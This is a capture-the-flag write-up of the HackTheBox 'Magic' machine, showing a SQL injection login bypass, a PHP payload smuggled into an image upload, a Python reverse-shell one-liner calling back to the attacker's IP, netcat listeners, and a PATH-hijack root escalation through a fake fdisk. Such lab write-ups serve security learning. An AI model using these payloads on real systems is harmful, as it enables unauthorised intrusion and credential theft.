---
title: Magic Writeup
author: Eno
date: 2020-04-20 11:30am
categories: [hackthebox]
tags: [hackthebox, writeup, magic]
math: true
image: /assets/img/htb/Magic/magic_infocard.png
---

### Let's do a NMAP scan

![dekstop](/assets/img/htb/Magic/01_nmap.png)


Browsing to http://10.10.10.185 we get a page with images and on the bottom left a login to upload images.


![dekstop](/assets/img/htb/Magic/02_login_message.png)


Let's click on the login link.


![dekstop](/assets/img/htb/Magic/03_login_blank.png)


I tried default top 10 usernames and passwords combos but nothing.

Since we have no credentials, we can try SQL injection

```
username: 'or '1'='1

password: 'or '1'='1
```

![dekstop](/assets/img/htb/Magic/04_login_sql.png)

We get prompted with an upload page for images.

![dekstop](/assets/img/htb/Magic/05_upload_img.png)

Let's see what can be uploaded. Let's just click upload.

![dekstop](/assets/img/htb/Magic/06_upload_img_error.png)

Only JPG, JPEG and PNG files are allowed. We need to bypass the filter.

Let's first upload a JPEG file and see where it saves it to.

When we upload a picture it adds it to the front page on the slider and so we can right click to view image and we can see it saves it under http://10.10.10.185/images/uploads/

Now let's do some magic

Take any JPG,JPEG or PNG inject it with some code and then rename the file.

![dekstop](/assets/img/htb/Magic/07_cmd_image_insert.png)

Upload this file via the upload page

In another terminal run nc -lvnp 9991

The only payload I found to work was the python method

Now point your browser or use curl to the following URL

http://10.10.10.185/images/uploads/lordcommander.php.jpeg?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.31",9991));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);

![dekstop](/assets/img/htb/Magic/08_img_rev_shell.png)

We have a shell!

Let's get an interactive shell

<ol><li>python -c 'import pty; pty.spawn("/bin/bash")'</li><li>ctrl + z (put's the nc into the background)</li><li>echo $TERM (this gets what your term is set as)</li><li>stty -a (this gets your windows size)</li><li>stty raw -echo (NOTE: you will not see any output after this)</li><li>fg (go back to the nc)</li><li>reset (this resets the terminal settings on the remote machine</li><li>In the Terminal type, type in the $TERM output you got, in my case it was xterm-256color. </li></ol>

NOTE: as of recent, this method I found has not been working as intended and sometimes hands the termminal. 

After enumerating a bit we get the following.

![dekstop](/assets/img/htb/Magic/09_db_details.png)

I tried to use the password to login via ssh and su but both failed.

This is not the password for the user.

Let's enumerate the database. There is no mysql client installed so the only way now is to do a mysqldump.

![dekstop](/assets/img/htb/Magic/10_db_dump.png)

We then find this in the dump.

![dekstop](/assets/img/htb/Magic/11_db_creds.png)

We have some creds. Password reuse?

Let us just su to the user with the password.

![dekstop](/assets/img/htb/Magic/12_user_login_png.png)

user flag achieved!

Now for root.

We first have to upload some enumerating scripts.

I uploaded both LinEnum and LinPEAS and found this pretty interesting:

![dekstop](/assets/img/htb/Magic/13_exec_files.png)

/bin/sysinfo is executable and the user group has permissions to run it.

There is another tool called pspy64 which monitors linux processes and we can use this to see what sysinfo does in the background. So we run /bin/sysinfo and monitor pspy64 and see the following.

![dekstop](/assets/img/htb/Magic/14_fdisk.png)

sysinfo calls a few files and seems like we can inject our own path to point to a custom created fdisk file to maybe create a reverse shell?

First in another terminal run our nc -lvnp 9994 

Back to the magic terminal and let us add /tmp into the system PATH

```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/bin:/usr/games:/usr/local/games:/snap/bin:/tmp
```

We then create a file in /tmp with the following.

![dekstop](/assets/img/htb/Magic/15_python_shell.png)

Make it executable and then run /bin/sysinfo again and we watch pspy64.

![dekstop](/assets/img/htb/Magic/16_run_script.png)

You can see it has now executed our code from the fdisk file we created in the /tmp directory instead of the actual operating system's fdisk!

Let us pop to the terminal where we can our nc.

![dekstop](/assets/img/htb/Magic/17_shell_pop.png)

WE HAVE ROOT!
